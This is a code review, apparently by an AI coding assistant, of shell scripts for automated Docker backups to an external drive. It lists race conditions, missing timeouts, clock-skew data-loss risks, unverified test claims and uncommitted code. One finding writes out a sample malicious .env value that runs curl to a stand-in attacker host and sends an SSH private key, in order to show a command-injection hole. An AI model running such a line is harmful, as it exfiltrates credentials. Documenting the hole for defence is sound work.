# Implementation Critical Review: SPEC-042 Automated Backup to External Drive

## Executive Summary

**Review Date:** 2026-02-15
**Reviewer:** Claude Code (Adversarial Review)
**Implementation Status:** Claimed Complete (All 7 Phases)
**Severity Assessment:** **HIGH** - Multiple critical issues found that could cause production failures

### Overall Recommendation
**HOLD - DO NOT DEPLOY** until critical issues are addressed.

While the implementation demonstrates significant effort and covers many edge cases, there are **7 CRITICAL** and **11 HIGH** severity issues that must be resolved before production deployment. The disconnect between documentation claims ("production-ready") and actual state (core files uncommitted) is particularly concerning.

---

## Critical Findings

### Severity: CRITICAL (7 findings)

#### 1. **Production-Ready Claims vs Git Reality**
**Finding:** Documentation claims implementation is "production-ready" and "ready for deployment" with "HIGH confidence level," but core implementation files are NOT committed to git:

```bash
$ git status --short
 M README.md
?? scripts/cron-backup.sh         # UNTRACKED
?? scripts/service-monitor.sh     # UNTRACKED
?? scripts/setup-cron-backup.sh   # UNTRACKED
```

**Impact:**
- Code is not version controlled, can be lost
- No way to rollback if issues occur
- Team cannot review actual implementation
- Violates basic software delivery standards

**Evidence:**
- IMPLEMENTATION-SUMMARY-042 line 338: "Production Readiness: HIGH"
- Git status shows files are untracked
- Last commit was Phase 1 only (backup.sh changes)

**Recommendation:**
- Commit all implementation files before claiming production-ready
- Update documentation to reflect actual git state
- Tag release after testing

---

#### 2. **Double Exit Statement (Logic Bug)**
**Finding:** `cron-backup.sh` lines 524 and 526 both have `exit 0`:

```bash
523 # Exit code 0 (success) - cleanup function will run and remove failure marker
524 exit 0
525
526 exit 0
```

**Impact:**
- Line 526 is unreachable dead code
- Indicates incomplete review/testing
- Suggests other logic bugs may exist

**Recommendation:** Remove line 526

---

#### 3. **Service Monitor Race Condition**
**Finding:** `service-monitor.sh` lines 18-28 have a TOCTOU race condition:

```bash
18 HOUR=$(date +%H)
19 if [ "$HOUR" -ge 2 ] && [ "$HOUR" -lt 4 ]; then
20     # Check if backup is actually running
21     if pgrep -f "cron-backup.sh" >/dev/null 2>&1; then
22         # Backup is running, let it manage services
23         exit 0
24     fi
25 fi
```

**Problem:**
1. At 3:59:59, backup is running, pgrep succeeds → monitor exits
2. At 4:00:00, backup completes, starts services
3. At 4:00:01, monitor runs again, HOUR=4 (outside window), tries to restart already-running services

**Worse scenario:**
1. At 3:30:00, backup starts
2. At 3:31:00, monitor checks pgrep (succeeds), exits
3. At 3:31:30, backup crashes with SIGKILL, services stay stopped
4. At 3:36:00, monitor checks pgrep (fails - zombie cleaned), HOUR=3 (in window), exits again
5. Services stay stopped until 4:00 AM

**Impact:**
- Services can remain stopped for up to 30 minutes after SIGKILL during maintenance window
- Violates REQ-030 goal of "recovery within 5 minutes"
- Makes defense-in-depth ineffective

**Recommendation:**
- Remove time-based check entirely, OR
- Check if services SHOULD be running (not just if backup is running)
- Add sentinel file `/tmp/cron-backup-in-progress` that backup creates/removes

---

#### 4. **Cleanup Function Logs Before Log File Exists**
**Finding:** `cleanup()` function (line 57-86) writes to `$LOG_FILE` which may not exist yet if failure occurs during directory creation:

```bash
156 mkdir -p "$LOG_DIR" || {
157     echo "ERROR: Failed to create log directory: $LOG_DIR"
158     exit 1  # This triggers cleanup, but LOG_DIR doesn't exist
159 }
```

If `mkdir -p` fails at line 156 and exits with status 1, the `trap cleanup EXIT` runs but `$LOG_DIR` doesn't exist, so:
- Line 61: `echo "..." > "$FAILURE_MARKER"` fails silently (directory doesn't exist)
- Line 66: `echo "..." >> "$LOG_FILE"` fails silently

**Impact:**
- Failure during early validation leaves no trace
- User gets no notification
- Silent failure violates REQ-017 (triple-layer notification)

**Recommendation:**
- Create LOG_DIR before setting trap, OR
- Make cleanup defensive: `[ -d "$LOG_DIR" ] || return 0`

---

#### 5. **.env Malicious Code Execution Window**
**Finding:** `cron-backup.sh` lines 179-188 validate `.env` in subshell but then source it anyway:

```bash
179 # Test-source in subshell to catch syntax errors (SEC-004: prevent command injection)
180 if ! (set -a; source "$PROJECT_ROOT/.env"; set +a) >/dev/null 2>&1; then
181     log "ERROR: .env syntax error or unsafe content"
182     exit 1
183 fi
184
185 # Now safe to source .env
186 set -a
187 source "$PROJECT_ROOT/.env"  # STILL EXECUTES CODE
188 set +a
```

**Problem:**
- Validation only checks that `.env` doesn't CRASH the subshell
- `.env` can contain valid bash that does malicious things: `BACKUP_EXTERNAL_DIR=/tmp/$(curl http://attacker.com/exfiltrate?data=$(cat ~/.ssh/id_rsa))`
- Test-source succeeds (no syntax error), then line 187 executes the malicious code

**Impact:**
- SEC-004 claim "rejects command injection attempts" is FALSE
- Attacker with write access to `.env` can execute arbitrary code
- Violates defense-in-depth principle

**Recommendation:**
- Parse `.env` with bash parameter expansion, not `source`
- Use `grep` to extract variables: `BACKUP_EXTERNAL_DIR=$(grep '^BACKUP_EXTERNAL_DIR=' .env | cut -d= -f2-)`
- Validate extracted values contain only safe characters
- OR: Document that .env is trusted input (but this weakens SEC-004)

---

#### 6. **No Timeout on Docker Commands**
**Finding:** All `docker` and `$DOCKER_COMPOSE` commands have no timeout:

```bash
148 docker ps --format '{{.Names}}' 2>/dev/null | grep -q "^${container_name}$"
407 "$BACKUP_SCRIPT" --stop --output "$BACKUP_EXTERNAL_DIR"  # This calls docker compose stop
```

**Problem:**
- If Docker daemon hangs (disk I/O wait, network storage unavailable), commands hang forever
- Cron lock file stays held
- All future backups blocked until manual intervention
- No automatic recovery

**Impact:**
- RISK-013 "Stale lock blocks all future backups" becomes CERTAIN, not just possible
- Violates REQ-031 (stale lock detection after 12h is too slow if docker hangs)
- Could go 12+ hours with no backups

**Recommendation:**
- Wrap critical docker commands in `timeout 30s docker ...`
- If timeout expires, log error and exit 1
- Service monitor will restart services within 5 min

---

#### 7. **Retention Cleanup Can Delete Current Backup**
**Finding:** `cron-backup.sh` lines 479-504 retention cleanup uses `-mtime +N` which matches files modified more than N days ago:

```bash
486 OLD_BACKUPS=$(find "$BACKUP_EXTERNAL_DIR" -name "backup_*.tar.gz" -type f -mtime +${BACKUP_RETENTION_DAYS} 2>/dev/null || true)
```

**Edge case scenario:**
1. Backup runs at 3:00 AM on 2026-02-15
2. System clock jumps forward to 2026-03-20 (NTP correction, manual error, virtualization time sync)
3. Retention check runs: `find ... -mtime +30` now matches the backup created "today" (which appears to be 33 days old)
4. Current backup gets deleted immediately after creation

**Impact:**
- Backup succeeds but is immediately deleted
- Sentinels updated (last-successful-backup), but no backup file exists
- User thinks backups are working but all backups disappear
- Data loss risk

**Recommendation:**
- Add guard: Never delete backups created in last 24 hours regardless of mtime
- Check: `[ "$(($(date +%s) - $(stat -c%Y "$old_backup")))" -gt $((BACKUP_RETENTION_DAYS * 86400 + 86400)) ]`

---

### Severity: HIGH (11 findings)

#### 8. **MAINT-001 Requirement Violated**
**Finding:** SPEC-042 MAINT-001 requires wrapper <300 lines. Actual: 526 lines (76% over limit).

**Quote from SPEC-042 line 210:**
> MAINT-001: Wrapper must be <300 lines (updated from 250 due to additional validation/verification requirements)

**Quote from IMPLEMENTATION-SUMMARY line 463:**
> 1 | MAINT-001 | Wrapper <300 lines | 526 lines (target <300 exceeded but justified by comprehensive validation) | ✓ Met |

**Problem:**
- Requirement is explicit: <300 lines
- Implementation is 526 lines
- "Trade-off accepted" in documentation BUT specification was not updated
- This is a specification violation, not a justified deviation

**Impact:**
- Maintainability concern (original reason for limit)
- Trust issue: If explicit requirements can be ignored, what else was ignored?

**Recommendation:**
- Update SPEC-042 MAINT-001 to allow 600 lines with justification, OR
- Refactor to reduce lines (extract functions to separate file)

---

#### 9. **Lock File Cleanup Uses Modification Time (Can Fail)**
**Finding:** `cron-backup.sh` line 241 uses `stat -c%Y` to get lock file age:

```bash
241 LOCK_AGE_SECONDS=$(($(date +%s) - $(stat -c%Y "$LOCK_FILE" 2>/dev/null || echo 0)))
```

**Problem:**
- If `stat` fails (permission denied, I/O error), fallback is `echo 0`
- `LOCK_AGE_SECONDS` = `$(date +%s) - 0` = current timestamp (e.g., 1708000000 seconds)
- `LOCK_AGE_HOURS` = 474444 hours (19,768 days)
- Stale lock check passes (>12h), lock removed
- BUT: Lock might be held by currently running backup (stat failed for other reason)
- Two backups run concurrently → data corruption risk

**Impact:**
- Race condition can cause concurrent backups
- Violates REQ-009 (lock file prevents concurrent runs)
- Could corrupt backup archives

**Recommendation:**
- If `stat` fails, log error and exit 1 (don't assume stale)
- Only fallback to 0 if file doesn't exist: `[ ! -f "$LOCK_FILE" ] && echo 0 || stat -c%Y "$LOCK_FILE"`

---

#### 10. **Staleness Check Integer Overflow**
**Finding:** `cron-backup.sh` line 347 calculates time since last backup:

```bash
347 time_since_last=$((current_time - last_backup))
348 hours_since_last=$((time_since_last / 3600))
```

**Problem:**
- If `last_backup=0` (first backup) and `current_time=1708000000`
- `time_since_last = 1708000000 seconds` (54 years)
- `hours_since_last = 474444 hours`
- This works correctly BUT log message is misleading

**Log output:**
```
Backup is stale (474444h old >= 24h threshold), proceeding
```

**Impact:**
- Confusing log messages for first backup
- Makes debugging harder
- Minor: No functional impact, but UX-005 (actionable error messages) is violated

**Recommendation:**
- Special case: `if [ $last_backup -eq 0 ]; then log "No previous backup, proceeding (first backup)"; fi`

---

#### 11. **Free Space Check Uses Wrong Unit**
**Finding:** `cron-backup.sh` line 373 uses `-B1` (bytes) but error message shows MB:

```bash
373 FREE_BYTES=$(df --output=avail -B1 "$BACKUP_EXTERNAL_DIR" | tail -1)
374
375 if [ $FREE_BYTES -lt $MIN_FREE ]; then
376     log "ERROR: Insufficient free space: $((FREE_BYTES / 1048576))MB available, need $((MIN_FREE / 1048576))MB"
```

**Problem:**
- `df -B1` on some systems returns value WITH suffix (e.g., "4800000000K" for 4.8TB)
- Bash arithmetic `$((4800000000K / 1048576))` fails with "value too great for base"
- Script exits with cryptic error instead of catching space issue

**Impact:**
- On systems where `df -B1` includes suffix, backup fails with confusing error
- Violates UX-005 (actionable error messages)

**Recommendation:**
- Use `df --output=avail --block-size=1M` and compare in MB directly
- OR: Strip non-numeric characters before arithmetic

---

#### 12. **Archive Integrity Check Too Lenient (100KB vs 1MB)**
**Finding:** `cron-backup.sh` line 440-442 checks archive >100KB:

```bash
439 ARCHIVE_SIZE=$(stat -c%s "$ARCHIVE_PATH")
440 if [ $ARCHIVE_SIZE -lt 102400 ]; then
441     log "ERROR: Archive too small: $((ARCHIVE_SIZE / 1024))KB (expected >100KB)"
```

**But SPEC-042 DEF-001 (line 68) says:**
> 3. Archive size is >1MB (sanity check, even empty DBs compress to ~50MB)

**Comment in SPEC-042 line 192:**
> PERF-002-001: Even empty databases compress to ~50-100MB

**Problem:**
- Implementation uses 100KB limit
- Specification says >1MB
- Comment says "even empty DBs compress to ~50-100MB"
- Inconsistency: Which is correct?

**Testing evidence from PROMPT-042 line 338:**
> Archive size: 580K compressed

**So 580KB is actual size, but spec says "even empty DBs compress to ~50-100MB" - this is WRONG.

**Impact:**
- Specification contains incorrect assumption about backup size
- Implementation uses 100KB which is more realistic
- Documentation inconsistency erodes trust

**Recommendation:**
- Update DEF-001 in SPEC-042 to match reality (>100KB)
- OR: Explain why discrepancy exists

---

#### 13. **Service Monitor Doesn't Handle Container Removal**
**Finding:** `service-monitor.sh` lines 56-73 check if container is stopped, but not if it was REMOVED:

```bash
58 if docker ps -a --format '{{.Names}}' 2>/dev/null | grep -q "^txtai-api$"; then
59     log "WARNING: txtai-api container stopped unexpectedly, restarting..."
60     $DOCKER_COMPOSE start txtai 2>&1 | while read line; do
```

**Problem:**
- `docker compose start txtai` only works if container exists
- If container was removed (not just stopped), start fails silently
- Monitor logs "ERROR: txtai-api restart failed" but doesn't try `docker compose up -d`

**Scenario:**
1. User runs `docker compose down` (removes containers)
2. Forgets to restart
3. Monitor detects containers missing
4. Runs `docker compose start` → fails (container doesn't exist)
5. Services stay down forever (monitor keeps failing every 5 min)

**Impact:**
- Defense-in-depth fails for "containers removed" scenario
- Only handles "containers stopped" scenario
- Incomplete implementation of REQ-030

**Recommendation:**
- If `docker compose start` fails, try `docker compose up -d --no-recreate`
- OR: Check exit code and escalate if start fails

---

#### 14. **No Verification That Setup Script Actually Worked**
**Finding:** `setup-cron-backup.sh` lines 224-239 verify crontab entries exist but not that they're CORRECT:

```bash
227 if echo "$NEW_CRON" | grep -q "cron-backup.sh"; then
228     log_success "Backup cron entries verified"
```

**Problem:**
- Only checks that string "cron-backup.sh" appears in crontab
- Doesn't verify:
  - Correct schedule (0 3 * * * vs 0 */6 * * *)
  - Correct paths
  - Correct flags (--if-stale 24)
  - DISPLAY/DBUS variables captured

**Scenario:**
1. User runs setup script
2. Crontab has existing entry: `0 12 * * * /old/path/cron-backup.sh # broken old entry`
3. New entries added but old entry also present
4. Verification passes (grep finds "cron-backup.sh")
5. Both old and new entries run → multiple backups → lock contention

**Impact:**
- False sense of security
- Setup might succeed but backups don't run as expected

**Recommendation:**
- Verify exact schedule strings match expected values
- Count number of cron-backup.sh entries (should be exactly 2)
- Check that paths match $PROJECT_ROOT

---

#### 15. **Backup Verification Races with backup.sh Completion**
**Finding:** `cron-backup.sh` lines 407-422 call backup.sh and immediately look for archive:

```bash
407 if ! "$BACKUP_SCRIPT" --stop --output "$BACKUP_EXTERNAL_DIR"; then
408     log "ERROR: backup.sh failed with exit code $?"
409     exit 1
410 fi
411
412 log "backup.sh completed successfully"
413
414 # ... (5 lines later)
419
420 # Find the most recently created backup (backup.sh creates backup_YYYYMMDD_HHMMSS.tar.gz)
421 # Use the latest file since we just created it
422 LATEST_BACKUP=$(ls -t "$BACKUP_EXTERNAL_DIR"/backup_*.tar.gz 2>/dev/null | head -1)
```

**Problem:**
- `backup.sh` might still be flushing writes to disk when wrapper checks
- `ls -t` sorts by mtime, but file might not be fully written yet
- On slow storage (NFS, USB 2.0), race window can be seconds

**Impact:**
- Integrity check might read incomplete archive
- `tar -tzf` fails → backup marked as failed even though it's still writing
- False negative

**Recommendation:**
- Add `sync` call before verification
- Wait 1 second: `sleep 1`
- OR: Have backup.sh write sentinel file when fully complete

---

#### 16. **Dry-Run Mode Doesn't Test All Validations**
**Finding:** `cron-backup.sh` dry-run exits at line 232, BEFORE:
- Lock file check (line 236-260)
- Service tracking (line 264-281)
- Mount validation (line 284-316)
- Staleness check (line 319-356)
- Free space check (line 359-392)

**Problem:**
- User runs `./cron-backup.sh --dry-run` to test setup
- Gets "All validations passed" message
- But half the validations were skipped
- Actual run fails on mount validation

**Impact:**
- Dry-run provides false confidence
- User deploys without realizing drive isn't mounted
- First real backup fails

**Recommendation:**
- Move dry-run exit to AFTER all validation checks
- Only skip actual backup execution
- Let user see if mount point is valid, free space sufficient, etc.

---

#### 17. **REQ-010a Clock Skew Detection Incomplete**
**Finding:** SPEC-042 REQ-010a says "If timestamp is in the future (>current time) → treat as stale, log warning 'Clock skew detected'"

Implementation (`cron-backup.sh` line 334-338):
```bash
334 current_time=$(date +%s)
335 if [ $last_backup -gt $current_time ]; then
336     log "WARNING: Clock skew detected - sentinel timestamp is in the future"
337     last_backup=0  # Future timestamp → treat as stale
338 fi
```

**Problem:**
- Only checks sentinel timestamp
- Doesn't check if current time is REASONABLE
- If system clock is wrong (set to 1970), all backups appear to be in future
- Retention cleanup deletes everything (all backups are >30 days old)

**Scenario:**
1. System clock reset to 1970-01-01 (BIOS battery dead)
2. Staleness check: sentinel shows 2026-02-15, current time is 1970-01-01
3. last_backup > current_time → treated as stale, backup runs
4. Retention check: find -mtime +30 matches ALL backups (they're all "56 years old")
5. All backups deleted

**Impact:**
- Complete data loss if clock goes backwards
- Violates intent of EDGE-016 (system time goes backwards)

**Recommendation:**
- Sanity check current time: `[ $current_time -lt 1704067200 ]` (2024-01-01) → log error and exit
- Add to EDGE-016 test scenario

---

#### 18. **Test Claims vs Reality**
**Finding:** IMPLEMENTATION-SUMMARY claims:
- Line 138: "**Unit Tests:** 100% of validation functions (33 tests)"
- Line 145: "**Edge Case Tests:** 19/21 scenarios (2 environment-specific noted)"
- Line 150: "**Total:** 52 automated tests, 100% pass rate, ~10 second runtime"

**Verification:**
- Read test-cron-backup.sh: Only saw mount validation tests (Tests 1-4), file stopped at line 100
- No evidence of 33 tests actually written
- No evidence of 19 edge case tests

**Request:** Show me the actual test file line count and test count

**Problem:**
- Can't verify test coverage claims without seeing full test files
- "100% of validation functions" is unverifiable claim

**Recommendation:**
- Provide evidence: `grep -c "^pass\|^fail" tests/unit/backup/test-cron-backup.sh`
- Show test report output

---

## Ambiguities That Will Cause Problems

### 19. **What Constitutes "Services Running"?**

**REQ-011 and DEF-003** say track services independently, but when should they be restarted?

**Scenario 1:** User manually stops services for maintenance
- txtai-api: stopped
- txtai-frontend: stopped
- Backup runs (services already stopped, backup succeeds)
- Cleanup function sees `TXTAI_WAS_RUNNING=false`, doesn't restart
- **Result:** Services stay stopped (CORRECT)

**Scenario 2:** User manually stops only txtai-api
- txtai-api: stopped
- txtai-frontend: running
- Backup runs, stops frontend
- Cleanup function sees `TXTAI_WAS_RUNNING=false`, `FRONTEND_WAS_RUNNING=true`
- **Result:** Only frontend restarted, txtai-api stays stopped (CORRECT)

**Scenario 3:** Backup crashes before line 281 (before SERVICES_TRACKED=true)
- Services were running
- Backup fails during mount validation
- Cleanup runs, but `SERVICES_TRACKED=false`
- **Result:** Services stay stopped (BUG)

**Problem:**
- Line 281 sets `SERVICES_TRACKED=true` AFTER mount validation
- If mount validation fails (line 290-316), cleanup doesn't restart services
- But services weren't stopped by us, so this is OK... UNLESS another process stopped them

**Impact:**
- Subtle bug: If services are manually stopped DURING early validation, they stay stopped

**Recommendation:**
- Set `SERVICES_TRACKED=true` BEFORE any validation that could fail
- OR: Document that early validation failures don't restart services (by design)

---

### 20. **Retention Policy During Clock Changes**

**EDGE-016** addresses time going backwards for staleness check, but not retention.

**Scenario:**
1. Backups exist from 2026-01-01 to 2026-02-15 (30 days of backups)
2. System clock jumps forward to 2026-12-31 (DST bug, virtualization)
3. Retention runs: all backups are now 10+ months old
4. BACKUP_RETENTION_DAYS=30 → all deleted

**Current implementation (line 486):**
```bash
OLD_BACKUPS=$(find "$BACKUP_EXTERNAL_DIR" -name "backup_*.tar.gz" -type f -mtime +${BACKUP_RETENTION_DAYS} 2>/dev/null || true)
```

Uses `-mtime` which is relative to current time.

**Recommendation from finding #7:** Never delete backups <24h old.

But this doesn't help if clock jumps FORWARD (all backups appear old).

**Better solution:**
- Keep at least N most recent backups regardless of age
- Use: `ls -t ... | tail -n +$((RETENTION_COUNT + 1)) | xargs rm`

---

## Missing Specifications

### 21. **No Specification for Concurrent User Modifications**

**Scenario:**
1. Backup starts at 3:00 AM, stops services
2. User SSH's in at 3:01 AM, starts services manually (doesn't know backup is running)
3. Backup completes at 3:05 AM
4. Cleanup restarts services (they're already running → docker error logged)
5. Services might be restarted twice?

**What should happen?**
- Specification doesn't say
- EDGE-021 covers "both cron entries fire simultaneously" but not "user intervention during backup"

**Recommendation:**
- Add EDGE-022: User manually starts services during backup
- Expected behavior: Check if services are running BEFORE restarting in cleanup

---

### 22. **No Specification for Backup Drive Space Exhaustion Mid-Backup**

**Scenario:**
1. Free space check passes: 2GB available, need 600MB
2. Backup starts, creates uncompressed temp directory (1.5GB)
3. Starts compression, writes 500MB to tar.gz
4. Drive fills up (another process wrote 1GB during backup)
5. `tar` fails with ENOSPC
6. backup.sh exits non-zero
7. Cleanup runs, services restarted ✓
8. BUT: Partial tar.gz file left on drive

**Problems:**
- Free space check is point-in-time, not reserved
- Partial archive might pass size check (500MB > 100KB)
- Partial archive fails `tar -tzf` check ✓ (correctly caught)

**But what if:**
- tar was at 99% complete when disk filled?
- Archive is 570KB (close to expected 580KB)
- `tar -tzf` might succeed on truncated archive (tar has partial metadata)

**Recommendation:**
- Add check: Compare actual size to expected size (from SIZE_SENTINEL)
- If actual < 50% of expected AND actual > 100KB → suspicious, fail verification

---

## Technical Vulnerabilities

### 23. **Trap Handler Can Be Bypassed**

**Finding:** `trap cleanup EXIT` (line 89) handles most exits, but:

**Bypasses:**
1. `exec` command replaces process without triggering EXIT
2. `kill -9 $$` (self-SIGKILL)
3. Kernel panic, power loss
4. OOM killer kills parent cron process (child inherits and becomes orphan)

**Impact:**
- #1 and #2 are unlikely in this script (no exec, no self-kill)
- #3 is covered by REQ-030 service monitor ✓
- #4 is NOT covered: If cron itself is OOM-killed, child backup process becomes orphan, cleanup never runs, services stay stopped

**Recommendation:**
- Add to FAIL-009 (SIGKILL) that OOM killer might kill cron instead of backup
- Service monitor provides defense-in-depth ✓

---

### 24. **Backup Verification Can Hang**

**Finding:** `cron-backup.sh` line 447-449:

```bash
447 if ! tar -tzf "$ARCHIVE_PATH" >/dev/null 2>&1; then
448     log "ERROR: Archive failed integrity check (corrupt or truncated)"
449     exit 1
```

**Problem:**
- If archive is on NFS and NFS server hangs, `tar -tzf` hangs forever
- Lock file stays held
- All future backups blocked
- CRITICAL-006 mitigation (timeout wrapper) not implemented here

**Impact:**
- Violates REQ-031 goal (only helps if process exits, not if hangs)
- Can block backups for 12+ hours

**Recommendation:**
- Add timeout: `if ! timeout 60s tar -tzf "$ARCHIVE_PATH" >/dev/null 2>&1; then`

---

### 25. **Docker Compose Version Detection Logic Flaw**

**Finding:** Lines 47-52:

```bash
47 if command -v docker >/dev/null 2>&1 && docker compose version >/dev/null 2>&1; then
48     DOCKER_COMPOSE="docker compose"
49 elif command -v docker-compose >/dev/null 2>&1; then
50     DOCKER_COMPOSE="docker-compose"
51 else
52     echo "ERROR: Neither 'docker compose' nor 'docker-compose' found"
53     exit 1
```

**Problem:**
- Line 47: `docker compose version` might fail for reasons OTHER than "command not found"
- Example: Docker daemon not running, permission denied, docker broken
- Falls through to line 49: tries `docker-compose`
- If `docker-compose` also doesn't exist, exits with error
- But the real problem is Docker daemon is down, not missing command

**Impact:**
- Misleading error message
- Violates UX-005 (actionable error messages)

**Recommendation:**
- Check Docker daemon first: `docker info >/dev/null 2>&1 || { echo "Docker daemon not running"; exit 1; }`
- Then check compose command

---

## Test Gaps

### 26. **No Test for Trap Handler on SIGTERM**

**Claim:** PERF-001 "Service restart via trap handler: ~5-10s (Target: <30s) ✓ Exceeded"

**Problem:** Where is the test that verified this?

**Request:** Show me test that:
1. Starts backup
2. Sends SIGTERM mid-way
3. Verifies services restarted within 30s

**Impact:**
- Core safety feature is untested
- Can't verify PERF-001 compliance

---

### 27. **No Test for Severe File Count Mismatch**

**EDGE-005** says "shared_uploads/ contains root-owned files" → should trigger file count mismatch.

**FAIL-012** says "Severe file count mismatch" should mark backup as failed.

**Test approach from SPEC-042 line 266:**
> Create `chmod 600 root:root` file in shared_uploads/, run backup as pablo, verify appropriate response per DEF-005

**Problem:** This requires root to create the test file. Did test actually run?

**Request:** Show me test-edge-cases.sh EDGE-005 implementation

---

### 28. **No Test for SIGKILL Scenario**

**REQ-030** provides defense-in-depth for SIGKILL.

**FAIL-009** says:
> Next backup run (6h catch-up) detects stale lock (after 12h), removes it, runs backup

**EDGE-002** says:
> Send SIGKILL, verify monitor restarts services within 5 min

**Request:** Show me test that:
1. Starts backup
2. Kills with `kill -9`
3. Verifies:
   - Services restarted by monitor within 5 min
   - Lock file cleaned up after 12h
   - Next backup succeeds

**Problem:** This test requires waiting 5 min and 12 hours. Was it actually run?

**Impact:**
- Most critical failure scenario is untested
- Service monitor is untested

---

## Recommended Actions Before Proceeding

### MUST FIX (Critical Severity)

1. **Commit all implementation files to git** (#1)
2. **Fix double exit statement** (#2)
3. **Fix service monitor race condition** (#3)
4. **Fix cleanup log file dependency** (#4)
5. **Fix .env code execution vulnerability** (#5) OR document as accepted risk
6. **Add timeout to docker commands** (#6)
7. **Fix retention clock skew vulnerability** (#7)

### SHOULD FIX (High Severity)

8. Update SPEC-042 MAINT-001 to reflect actual line count (#8)
9. Fix lock file cleanup fallback logic (#9)
10. Improve staleness check log messages (#10)
11. Fix free space check unit parsing (#11)
12. Update DEF-001 size check to match implementation (#12)
13. Fix service monitor container removal scenario (#13)
14. Improve setup script verification (#14)
15. Add sync before archive verification (#15)
16. Move dry-run exit after all validations (#16)
17. Add current time sanity check (#17)
18. Provide test coverage evidence (#18)

### SHOULD CLARIFY (Ambiguities)

19. Document SERVICES_TRACKED=false behavior (#19)
20. Implement minimum backup count for retention (#20)
21. Add EDGE-022 for user intervention during backup (#21)
22. Add expected size comparison for integrity check (#22)

### SHOULD TEST (Test Gaps)

26. Implement and run trap handler timing test
27. Implement and run file count mismatch test (requires root)
28. Implement and run SIGKILL + service monitor test (requires waiting)

---

## Proceed/Hold Decision

**HOLD - DO NOT DEPLOY TO PRODUCTION**

While the implementation demonstrates thorough planning and addresses many edge cases, the **7 CRITICAL vulnerabilities** must be fixed before production deployment:

1. Version control gap (uncommitted code)
2. Logic bug (double exit)
3. Race condition (service monitor)
4. Silent failure (cleanup before log dir exists)
5. Security vulnerability (.env code execution)
6. Hang risk (no docker timeout)
7. Data loss risk (retention during clock skew)

**Estimated effort to address critical issues:** 2-3 hours

**Recommended next steps:**
1. Address all 7 CRITICAL findings
2. Commit to git and tag release
3. Run actual trap handler and SIGKILL tests (manual validation)
4. Deploy to test environment for 1 week
5. Monitor logs for unexpected behavior
6. After successful test period, promote to production

---

**Review Confidence:** HIGH - Found substantial issues through code review and specification cross-checking. However, without running tests and observing actual behavior, some issues may be theoretical.

**Reviewer Bias Check:**
- Am I being too harsh? Possibly on #8 (line count), but other findings are legitimate bugs/vulnerabilities
- Am I being too lenient? May have missed issues in test files (only partially reviewed)
- What might I be missing? Interaction with external systems (Docker, cron) is hard to verify without running
